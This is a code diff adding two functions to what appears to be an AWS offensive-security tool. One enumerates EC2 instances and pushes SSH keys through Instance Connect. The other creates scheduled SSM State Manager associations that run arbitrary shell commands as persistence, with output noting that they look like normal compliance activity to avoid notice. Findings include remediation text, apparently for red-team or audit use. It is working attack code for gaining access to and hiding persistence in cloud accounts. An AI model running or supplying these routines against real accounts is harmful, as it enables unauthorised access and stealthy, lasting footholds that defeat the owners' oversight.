@@ -646,3 +646,174 @@ export async function cognitoBackdoor(args: string[], timeout: number): Promise<
 
   return { output: output.join("\n"), findings }
 }
+
+export async function ec2InstanceConnect(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const instanceId = argVal(args, "--instance-id")
+  const sshKey = argVal(args, "--ssh-public-key")
+  const osUser = argVal(args, "--os-user") || "ec2-user"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] EC2 Instance Connect — SSH Key Push\n"]
+
+  if (!instanceId && !hasFlag(args, "--enum")) {
+    const instances = await aws(["ec2", "describe-instances", "--filters", "Name=instance-state-name,Values=running", "--query", "Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,PlatformDetails,KeyName]"], profile, region, timeout)
+    if (instances.exitCode === 0) {
+      const il = tryJson(instances.stdout) || []
+      output.push(`[+] Running instances: ${il.length}`)
+      for (const i of il) {
+        output.push(`  ${i[0]}  Public: ${i[1] || "none"}  Private: ${i[2]}  Platform: ${i[3]}  Key: ${i[4] || "none"}`)
+      }
+
+      for (const i of il) {
+        if (!i[3]?.includes("Windows")) {
+          const check = await aws(["ec2-instance-connect", "send-ssh-public-key", "--instance-id", i[0], "--instance-os-user", osUser, "--ssh-public-key", "ssh-rsa AAAA_dry_run_probe", "--dry-run"], profile, region, timeout)
+          if (check.stderr.includes("DryRunOperation")) {
+            output.push(`  [+] Instance Connect available: ${i[0]}`)
+            findings.push({
+              checkId: "AWS-PERSIST-009",
+              provider: "aws",
+              severity: "high",
+              status: "AVAILABLE",
+              resource: `ec2:instance-connect:${i[0]}`,
+              title: `EC2 Instance Connect available: ${i[0]}`,
+              details: `SSH key push available — 60s window, appears as SendSSHPublicKey in CloudTrail (not SSH login)`,
+              remediation: "Restrict ec2-instance-connect:SendSSHPublicKey via IAM policy",
+            })
+          }
+        }
+      }
+      output.push("\n[*] Use --instance-id ID --ssh-public-key 'ssh-rsa AAAA...' to push a key")
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!instanceId) return { output: output.join("\n") + "\n[-] --instance-id required", findings }
+
+  if (!sshKey) {
+    const keyGen = await Bun.spawn(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", "/tmp/cs-ic-key", "-N", "", "-q"], { stdout: "pipe", stderr: "pipe" }).exited
+    if (keyGen === 0) {
+      const pubKey = await Bun.file("/tmp/cs-ic-key.pub").text()
+      output.push(`[+] Generated temporary key pair: /tmp/cs-ic-key`)
+
+      const push = await aws(["ec2-instance-connect", "send-ssh-public-key", "--instance-id", instanceId, "--instance-os-user", osUser, "--ssh-public-key", pubKey.trim()], profile, region, timeout)
+      if (push.exitCode === 0) {
+        const r = tryJson(push.stdout)
+        if (r?.Success) {
+          output.push(`[+] SSH key pushed successfully — 60 second window!`)
+          output.push(`[+] Connect: ssh -i /tmp/cs-ic-key ${osUser}@<IP>`)
+          findings.push({
+            checkId: "AWS-PERSIST-009",
+            provider: "aws",
+            severity: "critical",
+            status: "PUSHED",
+            resource: `ec2:instance-connect:${instanceId}`,
+            title: `SSH key pushed to ${instanceId} via Instance Connect`,
+            details: `Key valid for 60s, user: ${osUser}. Appears as ec2-instance-connect:SendSSHPublicKey in CloudTrail`,
+            remediation: "Revoke ec2-instance-connect:SendSSHPublicKey permission",
+          })
+        }
+      } else {
+        output.push(`[-] Push failed: ${push.stderr.trim()}`)
+      }
+    }
+  } else {
+    const push = await aws(["ec2-instance-connect", "send-ssh-public-key", "--instance-id", instanceId, "--instance-os-user", osUser, "--ssh-public-key", sshKey], profile, region, timeout)
+    if (push.exitCode === 0 && tryJson(push.stdout)?.Success) {
+      output.push(`[+] SSH key pushed — connect within 60s!`)
+      findings.push({
+        checkId: "AWS-PERSIST-009",
+        provider: "aws",
+        severity: "critical",
+        status: "PUSHED",
+        resource: `ec2:instance-connect:${instanceId}`,
+        title: `SSH key pushed to ${instanceId}`,
+        details: `Key valid for 60s, user: ${osUser}`,
+        remediation: "Revoke ec2-instance-connect:SendSSHPublicKey permission",
+      })
+    } else {
+      output.push(`[-] Push failed: ${push.stderr.trim()}`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function ssmStateManager(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const command = argVal(args, "--command")
+  const instanceId = argVal(args, "--instance-id")
+  const schedule = argVal(args, "--schedule") || "rate(1 hour)"
+  const assocName = argVal(args, "--name") || `cs-state-${Date.now().toString(36).slice(-6)}`
+  const findings: Finding[] = []
+  const output: string[] = ["[*] SSM State Manager — Scheduled Association\n"]
+
+  if (hasFlag(args, "--list") || !command) {
+    const assocs = await aws(["ssm", "list-associations", "--query", "Associations[].[AssociationId,Name,AssociationName,ScheduleExpression,Targets,LastExecutionDate]"], profile, region, timeout)
+    if (assocs.exitCode === 0) {
+      const al = tryJson(assocs.stdout) || []
+      output.push(`[+] Existing associations: ${al.length}`)
+      for (const a of al) {
+        output.push(`  ${a[2] || a[0]}  Doc: ${a[1]}  Schedule: ${a[3] || "none"}  LastRun: ${a[5] || "never"}`)
+        const targets = a[4] || []
+        for (const t of targets) output.push(`    Target: ${t.Key}=${t.Values?.join(",")}`)
+
+        if (String(a[2] || "").startsWith("cs-")) {
+          findings.push({
+            checkId: "AWS-PERSIST-010",
+            provider: "aws",
+            severity: "high",
+            status: "FOUND",
+            resource: `ssm:association:${a[0]}`,
+            title: `CyberStrike SSM association found: ${a[2]}`,
+            details: `Document: ${a[1]}, Schedule: ${a[3]}`,
+            remediation: `Delete: aws ssm delete-association --association-id ${a[0]}`,
+          })
+        }
+      }
+    }
+
+    if (!command) {
+      output.push("\n[*] Use --command CMD --instance-id ID [--schedule 'rate(1 hour)'] to create persistence")
+      return { output: output.join("\n"), findings }
+    }
+  }
+
+  if (!instanceId) return { output: output.join("\n") + "\n[-] --instance-id required", findings }
+
+  const createDoc = await aws([
+    "ssm", "create-association",
+    "--name", "AWS-RunShellScript",
+    "--association-name", assocName,
+    "--targets", `Key=instanceids,Values=${instanceId}`,
+    "--parameters", `commands=["${command.replace(/"/g, '\\"')}"]`,
+    "--schedule-expression", schedule,
+    "--compliance-severity", "UNSPECIFIED",
+  ], profile, region, timeout)
+
+  if (createDoc.exitCode === 0) {
+    const r = tryJson(createDoc.stdout)
+    output.push(`[+] Association created: ${assocName}`)
+    output.push(`    ID: ${r?.AssociationDescription?.AssociationId}`)
+    output.push(`    Schedule: ${schedule}`)
+    output.push(`    Target: ${instanceId}`)
+    output.push(`    Command: ${command}`)
+    output.push(`\n[*] More stealth than EventBridge — appears as normal SSM compliance`)
+
+    findings.push({
+      checkId: "AWS-PERSIST-010",
+      provider: "aws",
+      severity: "critical",
+      status: "CREATED",
+      resource: `ssm:association:${assocName}`,
+      title: `SSM State Manager persistence: ${assocName}`,
+      details: `Scheduled ${schedule} on ${instanceId}: ${command}`,
+      remediation: `Delete: aws ssm delete-association --association-name ${assocName}`,
+    })
+  } else {
+    output.push(`[-] Failed: ${createDoc.stderr.trim()}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
